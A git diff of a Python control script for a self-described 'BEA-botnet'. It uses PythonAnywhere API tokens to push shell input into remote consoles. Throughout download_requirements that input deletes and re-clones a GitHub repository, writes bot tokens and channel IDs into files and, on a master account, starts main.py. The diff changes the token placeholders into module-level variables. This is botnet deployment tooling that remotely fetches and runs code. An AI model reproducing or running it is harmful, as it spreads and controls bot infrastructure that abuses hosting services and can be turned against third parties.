@@ -1,5 +1,10 @@
 import requests, re
 
+BOTOGRAM_TOKEN = 
+CHANNEL_ID =
+MASTER_BOT_USERNAME =
+MASTER_BOT_API_ID = 
+
 def botnet_status(username, token):
     online = True
     response = requests.get('https://eu.pythonanywhere.com/api/v0/user/{username}/consoles/'.format(username=username), headers={'Authorization': 'Token {token}'.format(token=token)})
@@ -20,7 +25,7 @@ def botnet_status(username, token):
     else:
       print('Got unexpected status code {}: {!r}'.format(response.status_code, response.content))
 
-def download_requirements(username, token, level):
+def download_requirements(username, token, level, pos):
     response = requests.get('https://eu.pythonanywhere.com/api/v0/user/{username}/consoles/'.format(username=username), headers={'Authorization': 'Token {token}'.format(token=token)})
     if response.status_code == 200:
         consoles = re.split(":|,",response.content.decode("UTF-8"))
@@ -31,18 +36,18 @@ def download_requirements(username, token, level):
     requests.post('https://eu.pythonanywhere.com/api/v0/user/{username}/consoles/{id}/send_input/'.format(username=username, id=id), headers={'Authorization': 'Token {token}'.format(token=token)}, data=obj)
     obj = {"input":"cd\nrm -rf BEA-botnet\ngit clone https://github.com/pippognetow/BEA-botnet\n"}
     requests.post('https://eu.pythonanywhere.com/api/v0/user/{username}/consoles/{id}/send_input/'.format(username=username, id=id), headers={'Authorization': 'Token {token}'.format(token=token)}, data=obj)
-    obj = {"input":"cd BEA-botnet/BEA/bots\necho BOTOGRAM_TOKEN > assets/token.txt\necho CHANNEL_ID > assets/channelToken.txt\n"}
+    obj = {"input":"cd BEA-botnet/BEA/bots\necho " + BOTOGRAM_TOKEN + " > assets/token.txt\necho " + CHANNEL_ID + " > assets/channelToken.txt\n"}
     requests.post('https://eu.pythonanywhere.com/api/v0/user/{username}/consoles/{id}/send_input/'.format(username=username, id=id), headers={'Authorization': 'Token {token}'.format(token=token)}, data=obj)
-    if level == "master":
-        username = "MASTER_BOT_USERNAME"
-        token = "MASTER_BOT_API_ID"
+    if level == "master" and pos == 0:
+        username = MASTER_BOT_USERNAME
+        token = MASTER_BOT_API_ID
         response = requests.get('https://eu.pythonanywhere.com/api/v0/user/{username}/consoles/'.format(username=username), headers={'Authorization': 'Token {token}'.format(token=token)})
         if response.status_code == 200:
             consoles = re.split(":|,",response.content.decode("UTF-8"))
         else:
             print('Got unexpected status code {}: {!r}'.format(response.status_code, response.content))
         id = consoles[1]
-        obj = {"input":"\3cd\nrm -rf BEA-botnet\ngit clone https://github.com/pippognetow/BEA-botnet\ncd BEA-botnet/BEA/master\necho BOTOGRAM_TOKEN > assets/token.txt\necho CHANNEL_ID > assets/channelToken.txt\necho 0 > assets/lastMessage.txt\npython3 main.py\n"}
+        obj = {"input":"\3cd\nrm -rf BEA-botnet\ngit clone https://github.com/pippognetow/BEA-botnet\ncd BEA-botnet/BEA/master\necho " + BOTOGRAM_TOKEN + "> assets/token.txt\necho " + CHANNEL_ID + " > assets/channelToken.txt\necho 0 > assets/lastMessage.txt\npython3 main.py\n"}
         requests.post('https://eu.pythonanywhere.com/api/v0/user/{username}/consoles/{id}/send_input/'.format(username=username, id=id), headers={'Authorization': 'Token {token}'.format(token=token)}, data=obj)
 
 def send_commands(username, token, commands):
